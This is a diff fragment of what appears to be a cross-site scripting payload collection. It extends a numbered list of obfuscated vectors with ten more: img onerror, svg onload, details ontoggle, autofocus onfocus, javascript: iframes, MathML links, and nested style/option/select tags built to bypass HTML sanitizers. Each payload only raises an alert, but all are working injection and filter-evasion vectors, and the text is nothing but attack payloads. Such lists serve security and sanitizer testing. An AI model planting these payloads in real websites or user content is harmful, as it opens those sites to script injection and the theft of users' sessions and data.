@@ -8,3 +8,14 @@
 6. <object data="data:text/html,<body onload=setTimeout('a'+'lert(1)',100)></body>"></object>
 7. <audio src onloadstart=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),100)></audio>
 8. <form><button formaction="javascript:setTimeout('ale'+'rt(1)',100)">Click</button></form>
+
+<img src=x onerror=alert('XSS')>
+<style><style /><img src=x onerror=alert('XSS')>
+<img alt="<x" title="/><img src=x onerror=alert('XSS')>">
+<option><style></option></select><img src=x onerror=alert('XSS')></style>
+<svg/onload=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<input autofocus onfocus=alert('XSS')>
+<iframe src="javascript:alert(`XSS`)"></iframe>
+<math><mi//xlink:href='data:x,alert(1)'></math>
+<select><option></option></select><img src=x onerror=alert('XSS')>
